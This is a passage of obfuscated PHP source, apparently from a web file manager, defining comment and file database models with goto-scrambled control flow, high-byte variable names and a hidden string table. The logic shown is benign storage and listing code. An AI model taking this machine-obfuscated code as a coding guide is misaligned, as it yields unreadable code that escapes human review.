Model($_SERVER[¶ªÕß‚ØÁŸ][1121]); } public function getPathOuter($b¨™…Ü ˆ) { $F»Å—È¶Û¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$b¨™…Ü ˆ) { return $b¨™…Ü ˆ; } $b è°ËÜƒœ = $this->parse($b¨™…Ü ˆ); return trim(KodIO::makeShare($this->pathParse[$F»Å—È¶Û¬[375]], $b è°ËÜƒœ[$F»Å—È¶Û¬[375]]), $F»Å—È¶Û¬[8]); } protected function infoParse($a¸¬Ñ¹è¼”, $A›÷š£Ùë• = false, $aÕµíïÍ¼Ê = false) { $e’•¿…¹¶Ú =& $_SERVER[¶ªÕß‚ØÁŸ]; $d¬”Ø¿Õë = $this->pathParse[$e’•¿…¹¶Ú[375]]; $a“¶¨İ±¦ = trim($this->pathParse[$e’•¿…¹¶Ú[1015]], $e’•¿…¹¶Ú[8]); return Action($e’•¿…¹¶Ú[1127])->sharePathInfo($d¬”Ø¿Õë, $a“¶¨İ±¦); } public function infoFull($Dõ‘ÈÏ‹ĞÛ) { $bÕöíó§ÈŠ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cë²¨ˆ¥¸ = explode($bÕöíó§ÈŠ[8], trim($Dõ‘ÈÏ‹ĞÛ, $bÕöíó§ÈŠ[8])); if (count($cë²¨ˆ¥¸) > 1) { $c¨êä½×· = implode($bÕöíó§ÈŠ[8], array_splice($cë²¨ˆ¥¸, 1)); $FÍãê¦â¡„ = $this->model->pathInfoByPath($cë²¨ˆ¥¸[0], $c¨êä½×·); if (!$FÍãê¦â¡„) { return !1; } $this->pathParse[$bÕöíó§ÈŠ[1015]] = $FÍãê¦â¡„[$bÕöíó§ÈŠ[377]]; } return $this->infoParse($Dõ‘ÈÏ‹ĞÛ); } public function listAll($cºåŸ½Ÿå³) { goto e£Ò…Œ²»Î; cÔ»£¿‰›ï: foreach ($fÅŸ…±®ÉÀ as &$bİŒĞ›ãÓÛ) { check_abort(); $bİŒĞ›ãÓÛ[$a‚İœ…ç«‹[399]] = $eßœÈÏ†ø¥->_shareItemeParse($bİŒĞ›ãÓÛ[$a‚İœ…ç«‹[399]], $F§Ç±¦ñŞš); } return $fÅŸ…±®ÉÀ; goto BßÊšâß†Œ; e£Ò…Œ²»Î: $a‚İœ…ç«‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A¬§¾ÁÎ‡¸ = IO::info($this->pathParse[$a‚İœ…ç«‹[85]]); if (!$A¬§¾ÁÎ‡¸) { return array(); } goto AÏ”Ï‚—º; AÏ”Ï‚—º: $fÅŸ…±®ÉÀ = $this->model->listAll($cºåŸ½Ÿå³); $F§Ç±¦ñŞš = Model($a‚İœ…ç«‹[544])->getInfo($A¬§¾ÁÎ‡¸[$a‚İœ…ç«‹[449]]); $eßœÈÏ†ø¥ = Action($a‚İœ…ç«‹[1127]); goto cÔ»£¿‰›ï; BßÊšâß†Œ: } } goto bò©‡ò³³å; B×¶Ÿí«‰Ï: class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\x6e\164"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\x61\155\x65" => "\143\x6f\155\x6d\145\156\164\x5f\155\x65\x74\141", "\x6d\x65\x74\x61\106\151\x65\154\144" => "\x63\157\x6d\x6d\x65\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($b„‹ïçŸË“) { $BÍŠ˜»ˆëï =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($b„‹ïçŸË“[$BÍŠ˜»ˆëï[2134]]) { $BèÀƒø±ÙÁ = $this->where(array($BÍŠ˜»ˆëï[2135] => $b„‹ïçŸË“[$BÍŠ˜»ˆëï[2134]]))->find(); if (!$BèÀƒø±ÙÁ || $BèÀƒø±ÙÁ[$BÍŠ˜»ˆëï[379]] != $b„‹ïçŸË“[$BÍŠ˜»ˆëï[379]] || $BèÀƒø±ÙÁ[$BÍŠ˜»ˆëï[464]] != $b„‹ïçŸË“[$BÍŠ˜»ˆëï[464]]) { return !1; } $this->where(array($BÍŠ˜»ˆëï[2135] => $b„‹ïçŸË“[$BÍŠ˜»ˆëï[2134]]))->setAdd($BÍŠ˜»ˆëï[2136], 1); } return $this->add($b„‹ïçŸË“); } public function remove($f½°ºÂ„ŸÕ) { $EÁ ·ÅÏºå =& $_SERVER[¶ªÕß‚ØÁŸ]; $EµæŞÆ‡‰ = array($EÁ ·ÅÏºå[2135] => $f½°ºÂ„ŸÕ); $DÛ–“£¡„ = $this->where($EµæŞÆ‡‰)->find(); if ($DÛ–“£¡„[$EÁ ·ÅÏºå[2134]]) { $this->where(array($EÁ ·ÅÏºå[2135] => $DÛ–“£¡„[$EÁ ·ÅÏºå[2134]]))->setAdd($EÁ ·ÅÏºå[2136], -1); } return $this->where($EµæŞÆ‡‰)->delete(); } public function edit($f£ÈËŒº¶Æ, $aÉ›‹Íì·—) { $AŞÁ¯äÄß¼ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÖì˜§×ä‚ = array($AŞÁ¯äÄß¼[2135] => $f£ÈËŒº¶Æ); return $this->where($EÖì˜§×ä‚)->save(array($AŞÁ¯äÄß¼[2137] => $aÉ›‹Íì·—)); } public function prasise($d”ê¾šœ¯®) { $C…˜Ûöõ‡İ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cİ’Øöéƒº = Model($C…˜Ûöõ‡İ[2138]); $B›îÙ®Ùø = array($C…˜Ûöõ‡İ[2135] => $d”ê¾šœ¯®, $C…˜Ûöõ‡İ[1431] => USER_ID); $DÏƒ®‚‘äƒ = $cİ’Øöéƒº->where($B›îÙ®Ùø)->find(); if (!$DÏƒ®‚‘äƒ) { $cİ’Øöéƒº->add($B›îÙ®Ùø); $BŸí”á‡À = $this->where(array($C…˜Ûöõ‡İ[2135] => $d”ê¾šœ¯®))->setAdd($C…˜Ûöõ‡İ[2139], 1); } else { $cİ’Øöéƒº->where($B›îÙ®Ùø)->delete(); $BŸí”á‡À = $this->where(array($C…˜Ûöõ‡İ[2135] => $d”ê¾šœ¯®))->setAdd($C…˜Ûöõ‡İ[2139], -1); } return $BŸí”á‡À; } public function targetInfo($C¯ƒ¡ÅÑå, $CÚ²–ßÂ´) { goto E«Éù¬šÚ™; FøËøäÛ: return $CŸÔ¬Üœò§; goto BŸ«ù®ğ£‹; E«Éù¬šÚ™: $Bó°·ë²‚Í =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÉâÍÍ¿ß = array($Bó°·ë²‚Í[529] => $C¯ƒ¡ÅÑå, $Bó°·ë²‚Í[530] => $CÚ²–ßÂ´); $bŒ·Ä×¿¦æ = $this->where($EÉâÍÍ¿ß)->count(); goto dçæ˜¤ÆŠ…; dçæ˜¤ÆŠ…: $fÊÏ µéó = "\122\111\x47\x48\124\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\x63\x6f\155\155\x65\x6e\164\x5f\x70\x72\x61\151\163\145\x20\163\x74\x61\162\x20\157\156\40\143\x6f\x6d\155\145\x6e\164\x2e\143\157\155\155\x65\x6e\x74\111\104\x20\x3d\40\x73\x74\x61\x72\x2e\x63\157\155\x6d\x65\x6e\x74\111\x44"; $E‚Á›ËÓ¬£ = $this->alias($Bó°·ë²‚Í[350])->where($EÉâÍÍ¿ß)->join($fÊÏ µéó, $Bó°·ë²‚Í[2140])->count(); $CŸÔ¬Üœò§ = array($Bó°·ë²‚Í[2141] => $bŒ·Ä×¿¦æ, $Bó°·ë²‚Í[2142] => $E‚Á›ËÓ¬£); goto FøËøäÛ; BŸ«ù®ğ£‹: } public function listData($F¦“Ù²Î“ñ) { $DÕã‰ƒÆË =& $_SERVER[¶ªÕß‚ØÁŸ]; if (isset($F¦“Ù²Î“ñ[$DÕã‰ƒÆË[2143]])) { if ($F¦“Ù²Î“ñ[$DÕã‰ƒÆË[2143]]) { $F¦“Ù²Î“ñ[$DÕã‰ƒÆË[2144]] = array($DÕã‰ƒÆË[934], intval($F¦“Ù²Î“ñ[$DÕã‰ƒÆË[2143]])); } unset($F¦“Ù²Î“ñ[$DÕã‰ƒÆË[2143]]); } if (isset($F¦“Ù²Î“ñ[$DÕã‰ƒÆË[2145]])) { if ($F¦“Ù²Î“ñ[$DÕã‰ƒÆË[2145]]) { $F¦“Ù²Î“ñ[$DÕã‰ƒÆË[2144]] = array($DÕã‰ƒÆË[931], intval($F¦“Ù²Î“ñ[$DÕã‰ƒÆË[2145]])); } unset($F¦“Ù²Î“ñ[$DÕã‰ƒÆË[2145]]); } return $this->_listData($F¦“Ù²Î“ñ); } private function _listData($c¬­–óììï) { $B‹Ô¹­å =& $_SERVER[¶ªÕß‚ØÁŸ]; $Eâ©ù…¼ë = $this->where($c¬­–óììï)->_makeOrder()->selectPage(100); $this->_listAppendParent($Eâ©ù…¼ë[$B‹Ô¹­å[363]]); $this->_listAppendUser($Eâ©ù…¼ë[$B‹Ô¹­å[363]]); $this->_listAppendMeta($Eâ©ù…¼ë[$B‹Ô¹­å[363]]); return $Eâ©ù…¼ë; } private function _makeOrder() { $C·¾ŠÊ¸¶Œ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D¯×ğÒÉÊá = array($C·¾ŠÊ¸¶Œ[2139], $C·¾ŠÊ¸¶Œ[2136], $C·¾ŠÊ¸¶Œ[197]); $B‚Â³²Œ…í = Input::get($C·¾ŠÊ¸¶Œ[415], $C·¾ŠÊ¸¶Œ[7], $C·¾ŠÊ¸¶Œ[397], $D¯×ğÒÉÊá); $bªî¼–„Ä = Input::get($C·¾ŠÊ¸¶Œ[416], $C·¾ŠÊ¸¶Œ[7], $C·¾ŠÊ¸¶Œ[1433], array($C·¾ŠÊ¸¶Œ[2146], $C·¾ŠÊ¸¶Œ[413])); $FŠ¬µÊ£ = $B‚Â³²Œ…í . $C·¾ŠÊ¸¶Œ[50] . $bªî¼–„Ä; return $this->order($FŠ¬µÊ£); } private function _listAppendParent(&$dÎ¼©åŠ×š) { goto b–ßˆÏƒŞ; DÛÌñ‹¿íä: if (!$dÜ÷’í÷ä’) { return; } $cî‹‰¦ÎŒ = $this->where(array($cÆ®êÒÑÀ[2135] => array($cÆ®êÒÑÀ[7], $dÜ÷’í÷ä’)))->select(); $cî‹‰¦ÎŒ = array_to_keyvalue($cî‹‰¦ÎŒ, $cÆ®êÒÑÀ[2144]); goto E©«£™ƒ……; E©«£™ƒ……: foreach ($dÎ¼©åŠ×š as &$AŸïë®ƒÎÔ) { if (isset($cî‹‰¦ÎŒ[$AŸïë®ƒÎÔ[$cÆ®êÒÑÀ[2134]]])) { $AŸïë®ƒÎÔ[$cÆ®êÒÑÀ[2147]] = $cî‹‰¦ÎŒ[$AŸïë®ƒÎÔ[$cÆ®êÒÑÀ[2134]]]; } } goto bœ’Ó¯–ğ; b–ßˆÏƒŞ: $cÆ®êÒÑÀ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dÜ÷’í÷ä’ = array_unique(array_to_keyvalue($dÎ¼©åŠ×š, $cÆ®êÒÑÀ[33], $cÆ®êÒÑÀ[2134])); $dÜ÷’í÷ä’ = array_remove_value($dÜ÷’í÷ä’, $cÆ®êÒÑÀ[476]); goto DÛÌñ‹¿íä; bœ’Ó¯–ğ: } private function _listAppendUser(&$e„È¥ôøÉ) { goto D’‡ğÉ±ç; fÛ­çÂ·Œñ: foreach ($e„È¥ôøÉ as &$bİÀ‘Ûêè) { $bİÀ‘Ûêè[$B’Í™·µ×ó[543]] = $c¦Šğê›ø[$bİÀ‘Ûêè[$B’Í™·µ×ó[1440]]]; if (isset($bİÀ‘Ûêè[$B’Í™·µ×ó[2147]])) { $bİÀ‘Ûêè[$B’Í™·µ×ó[2147]][$B’Í™·µ×ó[543]] = $c¦Šğê›ø[$bİÀ‘Ûêè[$B’Í™·µ×ó[2147]][$B’Í™·µ×ó[1440]]]; } } goto DÄ´¼ƒØİ®; D’‡ğÉ±ç: $B’Í™·µ×ó =& $_SERVER[¶ªÕß‚ØÁŸ]; $E‹«–ôÍŒ­ = array_unique(array_to_keyvalue($e„È¥ôøÉ, $B’Í™·µ×ó[33], $B’Í™·µ×ó[1440])); $E‹«–ôÍŒ­ = array_remove_value($E‹«–ôÍŒ­, $B’Í™·µ×ó[476]); goto Bî°…Ã­; Bî°…Ã­: if (count($E‹«–ôÍŒ­) == 0) { return; } foreach ($e„È¥ôøÉ as $bİÀ‘Ûêè) { if (isset($bİÀ‘Ûêè[$B’Í™·µ×ó[2147]])) { $E‹«–ôÍŒ­[] = $bİÀ‘Ûêè[$B’Í™·µ×ó[2147]][$B’Í™·µ×ó[1440]]; } } $c¦Šğê›ø = Model($B’Í™·µ×ó[485])->userListInfo($E‹«–ôÍŒ­); goto fÛ­çÂ·Œñ; DÄ´¼ƒØİ®: } private function _listAppendMeta(&$A¥í”·İ ) { goto FÑ×êëÓ; CÑä““ª: if (!$aßÚ§¬ã ) { return; } foreach ($A¥í”·İ  as $EêĞíİí™ë) { if (isset($EêĞíİí™ë[$CÕ×èË—ºî[2147]])) { $aßÚ§¬ã [] = $EêĞíİí™ë[$CÕ×èË—ºî[2147]][$CÕ×èË—ºî[2144]]; } } $Aß—Ë†á°‹ = $this->metaList($aßÚ§¬ã ); goto cŠœ‚Û•šÄ; cŠœ‚Û•šÄ: if (!$Aß—Ë†á°‹) { return !1; } foreach ($A¥í”·İ  as &$EêĞíİí™ë) { $EêĞíİí™ë[$CÕ×èË—ºî[425]] = $Aß—Ë†á°‹[$EêĞíİí™ë[$CÕ×èË—ºî[2144]]]; if (isset($EêĞíİí™ë[$CÕ×èË—ºî[2147]])) { $EêĞíİí™ë[$CÕ×èË—ºî[2147]][$CÕ×èË—ºî[425]] = $Aß—Ë†á°‹[$EêĞíİí™ë[$CÕ×èË—ºî[2147]][$CÕ×èË—ºî[2144]]]; } } goto eåÒÉ¹èÒ; FÑ×êëÓ: $CÕ×èË—ºî =& $_SERVER[¶ªÕß‚ØÁŸ]; $aßÚ§¬ã  = array_unique(array_to_keyvalue($A¥í”·İ , $CÕ×èË—ºî[33], $CÕ×èË—ºî[2144])); $aßÚ§¬ã  = array_remove_value($aßÚ§¬ã , $CÕ×èË—ºî[476]); goto CÑä““ª; eåÒÉ¹èÒ: } private function metaList($e®òèŸÄ¼¿) { goto FÁ¬Üğ®·; dÓœñö®Ñ: $eÇÆ¶’İ¤³ = Model($FÕùì¢¼É°[2148])->where($F±·¢’â¤)->select(); $eÇÆ¶’İ¤³ = array_to_keyvalue_group($eÇÆ¶’İ¤³, $FÕùì¢¼É°[2144]); foreach ($eÇÆ¶’İ¤³ as $b“º×éš¤” => $AºçØóøÙ•) { $d¹Êİ†™ÖÇ = array(); foreach ($AºçØóøÙ• as $D‹ÍéË¨ßã) { $d¹Êİ†™ÖÇ[$D‹ÍéË¨ßã[$FÕùì¢¼É°[99]]] = $D‹ÍéË¨ßã[$FÕùì¢¼É°[368]]; } $eÇÆ¶’İ¤³[$b“º×éš¤”] = $d¹Êİ†™ÖÇ; } goto b¡‹†ßêÅÏ; FÁ¬Üğ®·: $FÕùì¢¼É° =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$e®òèŸÄ¼¿) { return array(); } $F±·¢’â¤ = array($FÕùì¢¼É°[2144] => array($FÕùì¢¼É°[7], $e®òèŸÄ¼¿)); goto dÓœñö®Ñ; b¡‹†ßêÅÏ: return $eÇÆ¶’İ¤³ ? $eÇÆ¶’İ¤³ : array(); goto AŞ¥ñæ«ª¯; AŞ¥ñæ«ª¯: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\154\x65"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\141\155\x65" => "\151\157\x5f\x66\151\154\x65\137\x6d\145\x74\x61", "\x6d\x65\164\x61\x46\151\145\x6c\x64" => "\146\x69\154\x65\x49\104"); public function fileInfo($AµÏ¶¨Ú‘Á) { $FÁ”öóˆßç =& $_SERVER[¶ªÕß‚ØÁŸ]; static $EÔç¡ôˆ¬ = array(); if (!isset($EÔç¡ôˆ¬[$AµÏ¶¨Ú‘Á])) { $FÏÏ–ÈƒµĞ = $FÁ”öóˆßç[2149]; $Aš™ğš‹«… = Model($FÁ”öóˆßç[430])->field($FÏÏ–ÈƒµĞ)->where(array($FÁ”öóˆßç[428] => $AµÏ¶¨Ú‘Á))->find(); $EÔç¡ôˆ¬[$AµÏ¶¨Ú‘Á] = $Aš™ğš‹«…; } return $EÔç¡ôˆ¬[$AµÏ¶¨Ú‘Á]; } public function addFileByContent($Añò°ë™©• = '', $EÎ¦ğ™‘éŠ = '') { goto B¼“ô…Š„´; B¼“ô…Š„´: $e†Å‰æË¢ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BÃéØŒÁ‡¥ = TEMP_PATH . $e†Å‰æË¢[2150]; if (!is_dir($BÃéØŒÁ‡¥)) { mk_dir($BÃéØŒÁ‡¥); } goto d‚ß†õù­; d‚ß†õù­: $fÒ½„¦—à = $BÃéØŒÁ‡¥ . $e†Å‰æË¢[2151] . rand_string(16); file_put_contents($fÒ½„¦—à, $Añò°ë™©•); $e«‘Õ„â± = $this->addFile($fÒ½„¦—à, $EÎ¦ğ™‘éŠ, !0); goto D‹®Ğ´à˜”; D‹®Ğ´à˜”: if (file_exists($fÒ½„¦—à)) { @unlink($fÒ½„¦—à); } return $e«‘Õ„â±; goto D¹Šè„è°ß; D¹Šè„è°ß: } public function createFileName($CŞ¼¬®¶ï•) { goto cİ‰ª«šâ­; C—²Å‘’ß: if (!$b±¿Ş”†– && !Cache::get($eï¾Ûáˆéí)) { $b±¿Ş”†– = !0; $A«Ê¤†ö†« = IO::mkdir($B°­èâÑ ä); if (!IO::exist($A«Ê¤†ö†« . $b‡‘°ÅØ[2153])) { IO::mkfile($A«Ê¤†ö†« . $b‡‘°ÅØ[2153]); } Cache::set($eï¾Ûáˆéí, 1, 3600 * 2); } return $b§‡šô—æó; goto c°ç•¾®ô³; cİ‰ª«šâ­: $b‡‘°ÅØ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Bßà²Îà“ = IO::init($b‡‘°ÅØ[8]); $b§‡šô—æó = $this->makeFilePath($CŞ¼¬®¶ï•, $Bßà²Îà“); goto DóƒŸŠùÉ; DóƒŸŠùÉ: $B°­èâÑ ä = $Bßà²Îà“->pathFather($b§‡šô—æó); static $b±¿Ş”†– = false; $eï¾Ûáˆéí = $b‡‘°ÅØ[2152] . md5($B°­èâÑ ä); goto C—²Å‘’ß; c°ç•¾®ô³: } public function makeFilePath($aöÕÒµ§ŞÒ, $a¢‡ß×—‡¦) { goto e÷Æáé˜; D¹‡Ï°Ï³ö: $C˜İöÉš ‚ = $A‚ËŸ¤òß . rand_string(5) . short_id(100); $aöÕÒµ§ŞÒ = str_replace($bææë™Ãª±[8], $bææë™Ãª±[80], KodIO::clear($aöÕÒµ§ŞÒ)); if (!$aöÕÒµ§ŞÒ) { $F›ôõÆÂĞ = $bææë™Ãª±[2156]; } goto b‚ÖùÑŞ‘©; e÷Æáé˜: $bææë™Ãª± =& $_SERVER[¶ªÕß‚ØÁŸ]; $F›ôõÆÂĞ = Model($bææë™Ãª±[1092])->get($bææë™Ãª±[2154]); $A‚ËŸ¤òß = KodIO::defaultIO() . date($bææë™Ãª±[2155]); goto D¹‡Ï°Ï³ö; b‚ÖùÑŞ‘©: switch ($F›ôõÆÂĞ) { case $bææë™Ãª±[2157]: $C˜İöÉš ‚ = $C˜İöÉš ‚ . $bææë™Ãª±[101] . $a¢‡ß×—‡¦->ext($aöÕÒµ§ŞÒ); if ($a¢‡ß×—‡¦->ext($aöÕÒµ§ŞÒ) == $bææë™Ãª±[2097]) { $C˜İöÉš ‚ .= $bææë™Ãª±[2158]; } break; case $bææë™Ãª±[2159]: goto eóøîåÆŠ•; aö¿ô•œ¬”: if ($a¢‡ß×—‡¦->ext($aöÕÒµ§ŞÒ) == $bææë™Ãª±[2097]) { $aöÕÒµ§ŞÒ .= $bææë™Ãª±[2158]; } $eî‹„‹·”Ã = IO::fileNameAuto($A‚ËŸ¤òß, $aöÕÒµ§ŞÒ); $C˜İöÉš ‚ = $A‚ËŸ¤òß . $eî‹„‹·”Ã; goto EÁ”ã½•°ì; eóøîåÆŠ•: $a™Ñ¼»Ïí = Model($bææë™Ãª±[1092])->get($bææë™Ãª±[1339]); $eÓÄˆ‚Õ¦ª = substr(md5($bææë™Ãª±[1917] . $a™Ñ¼»Ïí . date($bææë™Ãª±[700])), 0, 8); $A‚ËŸ¤òß = KodIO::defaultIO() . date($bææë™Ãª±[2160]) . $eÓÄˆ‚Õ¦ª . $bææë™Ãª±[8]; goto aö¿ô•œ¬”; EÁ”ã½•°ì: break; goto F„äˆìÊ¢„; F„äˆìÊ¢„: case $bææë™Ãª±[2156]: break; default: break; } return $C˜İöÉš ‚; goto a‡«õ¿À†³; a‡«õ¿À†³: } public function addFileByRemote($AÆ ­ˆÆ“, $FŞŠÚ†œ¿¹, $EÂß¹˜¼¼ƒ = array()) { goto dáÊò¤Õ; cöºš…Ñƒ»: $EæÑ¤†È‹ƒ = IO::hashMd5($AÆ ­ˆÆ“, $f¾áµ’·èæ); $dŒœ‡ø¶¾ = KodIO::defaultDriver(); $DÉÃ¡²‚ì = array($Däøò¤‡Ä¦[528] => IO::size($AÆ ­ˆÆ“), $Däøò¤‡Ä¦[2161] => 1, $Däøò¤‡Ä¦[394] => $FŞŠÚ†œ¿¹, $Däøò¤‡Ä¦[749] => $dŒœ‡ø¶¾[$Däøò¤‡Ä¦[375]], $Däøò¤‡Ä¦[395] => $AÆ ­ˆÆ“, $Däøò¤‡Ä¦[2162] => $EÂß¹˜¼¼ƒ[$Däøò¤‡Ä¦[174]] ? $EÂß¹˜¼¼ƒ[$Däøò¤‡Ä¦[174]] : IO::hashSimple($AÆ ­ˆÆ“), $Däøò¤‡Ä¦[2163] => $EæÑ¤†È‹ƒ ? $EæÑ¤†È‹ƒ : $f¾áµ’·èæ); goto a‡‘Ÿƒ¥¬â; dáÊò¤Õ: $Däøò¤‡Ä¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!IO::exist($AÆ ­ˆÆ“)) { return !1; } $f¾áµ’·èæ = $EÂß¹˜¼¼ƒ[$Däøò¤‡Ä¦[173]] ? $EÂß¹˜¼¼ƒ[$Däøò¤‡Ä¦[173]] : $Däøò¤‡Ä¦[33]; goto cöºš…Ñƒ»; a‡‘Ÿƒ¥¬â: if ($AÏ‹áå¦¥ = $this->addFileCheckExist($DÉÃ¡²‚ì[$Däøò¤‡Ä¦[174]], $DÉÃ¡²‚ì[$Däøò¤‡Ä¦[173]], $DÉÃ¡²‚ì[$Däøò¤‡Ä¦[87]])) { return $AÏ‹áå¦¥; } return $this->addFileData($DÉÃ¡²‚ì); goto eñŞ‡Åå†ê; eñŞ‡Åå†ê: } private function addFileData($b¬Å…—® Ô) { $bÛ¿·ÛğÒ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$b¬Å…—® Ô) { return !1; } $b¬Å…—® Ô[$bÛ¿·ÛğÒ[87]] = intval($b¬Å…—® Ô[$bÛ¿·ÛğÒ[87]]); if (!$b¬Å…—® Ô[$bÛ¿·ÛğÒ[87]] && strlen($b¬Å…—® Ô[$bÛ¿·ÛğÒ[174]]) > 32) { $b¬Å…—® Ô[$bÛ¿·ÛğÒ[87]] = intval(substr($b¬Å…—® Ô[$bÛ¿·ÛğÒ[174]], 32)); } $a±÷«ëÀãŒ = $this->add($b¬Å…—® Ô); return $this->find($a±÷«ëÀãŒ); } public function addFile($d¦Û’¼–ƒŒ, $e®Œš¤‹Çò, $a›İçÃİÄ = false) { $C‘ŸØµÑí˜ = IO::hashSimple($d¦Û’¼–ƒŒ); $DÍÚË…ÇìÇ = IO::hashMd5($d¦Û’¼–ƒŒ); $C·‹‹è‚‚† = IO::size($d¦Û’¼–ƒŒ); if ($CÎ¿Ä­¯Ï» = $this->addFileCheckExist($C‘ŸØµÑí˜, $DÍÚË…ÇìÇ, $C·‹‹è‚‚†)) { return $CÎ¿Ä­¯Ï»; } $AÁõøœÖì = $this->addFileMake($d¦Û’¼–ƒŒ, $C·‹‹è‚‚†, $C‘ŸØµÑí˜, $DÍÚË…ÇìÇ, $e®Œš¤‹Çò, $a›İçÃİÄ); return $this->addFileData($AÁõøœÖì); } public function addFileMake($DëùÆòĞùä, $C‘àÓª‚ÕŒ, $Cµ¶¾¶†È, $BÙßÛÖË±â, $B¹µÂğì, $aø°‹á¥ï) { goto A„”ˆĞÀš‡; A„”ˆĞÀš‡: $cñ„’óÚ”¡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c¶Îê×–â× = $this->createFileName($B¹µÂğì); $cÙ†àìŠÁ• = get_path_father($c¶Îê×–â×); goto C©ÉØ•§º; dô¸‹°ŠÅÊ: $aÂÕàÏÌÈÑ = KodIO::defaultDriver(); $b±¨ºÆƒÒ = array($cñ„’óÚ”¡[528] => $C‘àÓª‚ÕŒ, $cñ„’óÚ”¡[2161] => 1, $cñ„’óÚ”¡[394] => $B¹µÂğì, $cñ„’óÚ”¡[749] => $aÂÕàÏÌÈÑ[$cñ„’óÚ”¡[375]], $cñ„’óÚ”¡[395] => $c¶Îê×–â×, $cñ„’óÚ”¡[2162] => $Cµ¶¾¶†È, $cñ„’óÚ”¡[2163] => $BÙßÛÖË±â); return $b±¨ºÆƒÒ; goto D‘«Ö¤´Õô; C©ÉØ•§º: $FÑÕç¸—‰† = get_path_this($c¶Îê×–â×); if ($aø°‹á¥ï) { $fÒà«æ¦‰¾ = IO::move($DëùÆòĞùä, $cÙ†àìŠÁ•, !1, $FÑÕç¸—‰†); } else { $fÒà«æ¦‰¾ = IO::copy($DëùÆòĞùä, $cÙ†àìŠÁ•, !1, $FÑÕç¸—‰†); } if (!$fÒà«æ¦‰¾) { return !1; } goto dô¸‹°ŠÅÊ; D‘«Ö¤´Õô: } public function addFileCheckExist($c¯ßŒàõ¬Ö, $b±‘‘ÍãÃ¨, $AîáìÉ…ÜÓ) { $fî¹ÇËßƒÔ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DÈ†õĞ…’‚ = $this->findByHash($c¯ßŒàõ¬Ö, $b±‘‘ÍãÃ¨); if (!$DÈ†õĞ…’‚) { return !1; } $b©Øæ©”î = array($fî¹ÇËßƒÔ[2161] => intval($DÈ†õĞ…’‚[$fî¹ÇËßƒÔ[2164]]) + 1, $fî¹ÇËßƒÔ[528] => $AîáìÉ…ÜÓ); $this->where(array($fî¹ÇËßƒÔ[428] => $DÈ†õĞ…’‚[$fî¹ÇËßƒÔ[427]]))->save($b©Øæ©”î); return $DÈ†õĞ…’‚; } public function remove($fã›˜‡àì) { $this->linkCountChange($fã›˜‡àì, !1); $this->clearEmpty(); return !0; } public function linkAdd($D—®Ç‹–ÕÆ) { $this->linkCountChange($D—®Ç‹–ÕÆ, !0); } public function linkCountChange($b—Æ‡­‰Øğ, $F¼¯æ„‚™) { goto eªèÏéÅî÷; eªèÏéÅî÷: $eÁ˜‹Â¼Ç =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$b—Æ‡­‰Øğ) { return; } if (!is_array($b—Æ‡­‰Øğ)) { $b—Æ‡­‰Øğ = array($b—Æ‡­‰Øğ); } goto DŞàÃœÂäÕ; b–È ø–¿˜: foreach ($aĞ±‰ñŠ„ as $d¿Õ‘¾÷À => $a®•¸¸Úà‘) { $dâ»à£ôø‹ = $a®•¸¸Úà‘ . $eÁ˜‹Â¼Ç[33]; if (!$BŸŸ¬„íã®[$dâ»à£ôø‹]) { $BŸŸ¬„íã®[$dâ»à£ôø‹] = array(); } $BŸŸ¬„íã®[$dâ»à£ôø‹][] = $d¿Õ‘¾÷À; } foreach ($BŸŸ¬„íã® as $a®•¸¸Úà‘ => $eŒšÀ»ì¤) { if (!$eŒšÀ»ì¤) { continue; } $a®•¸¸Úà‘ = $F¼¯æ„‚™ ? $a®•¸¸Úà‘ : -intval($a®•¸¸Úà‘); $A©¨³ù²Öä = array($eÁ˜‹Â¼Ç[427] => array($eÁ˜‹Â¼Ç[7], $eŒšÀ»ì¤)); if ($a®•¸¸Úà‘ < 0) { $A©¨³ù²Öä[$eÁ˜‹Â¼Ç[2164]] = array($eÁ˜‹Â¼Ç[935], abs($a®•¸¸Úà‘)); } $this->where($A©¨³ù²Öä)->setAdd($eÁ˜‹Â¼Ç[2164], $a®•¸¸Úà‘); } goto DÊ•ò¦£ÎÅ; DŞàÃœÂäÕ: $aĞ±‰ñŠ„ = array(); foreach ($b—Æ‡­‰Øğ as $d¿Õ‘¾÷À) { $dâ»à£ôø‹ = $d¿Õ‘¾÷À . $eÁ˜‹Â¼Ç[33]; if (!$aĞ±‰ñŠ„[$dâ»à£ôø‹]) { $aĞ±‰ñŠ„[$dâ»à£ôø‹] = 0; } $aĞ±‰ñŠ„[$dâ»à£ôø‹]++; } $BŸŸ¬„íã® = array(); goto b–È ø–¿˜; DÊ•ò¦£ÎÅ: } public function findByHash($e”éé’õò‰, $CáÍš¨Ÿ¨¤ = false) { $C™°®Š†ÕÂ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$e”éé’õò‰ && !$CáÍš¨Ÿ¨¤) { return !1; } $D›ğä¤„ = array($C™°®Š†ÕÂ[2162] => $e”éé’õò‰); if ($CáÍš¨Ÿ¨¤) { $D›ğä¤„ = array($C™°®Š†ÕÂ[2163] => $CáÍš¨Ÿ¨¤); } return $this->order($C™°®Š†ÕÂ[2165])->where($D›ğä¤„)->find(); } public function 